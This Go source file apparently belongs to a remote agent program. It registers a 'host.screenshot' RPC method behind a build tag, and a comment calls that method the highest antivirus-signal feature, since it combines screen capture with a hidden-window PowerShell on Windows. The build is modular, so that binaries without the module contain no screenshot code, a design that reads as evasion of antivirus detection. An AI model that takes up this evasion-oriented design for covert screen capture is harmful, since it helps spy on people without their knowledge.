//go:build !modular || mod_screen

package main

import (
	"context"
	"encoding/json"

	"github.com/fakecrowd/sys0/internal/rpc"
	"github.com/fakecrowd/sys0/internal/wire"
)

// SCREEN MODULE registration — host.screenshot is the highest-AV-signal method
// (screen capture + hidden-window powershell on Windows). The capture/encode
// implementation lives in screenshot.go (also tagged mod_screen), so a binary
// without this module physically contains NO screenshot code.

func init() {
	registerMethod(wire.MethodHostScreenshot, func(a *Agent, _ context.Context, params json.RawMessage) (any, *rpc.Error) {
		return a.doScreenshot(params)
	})
}
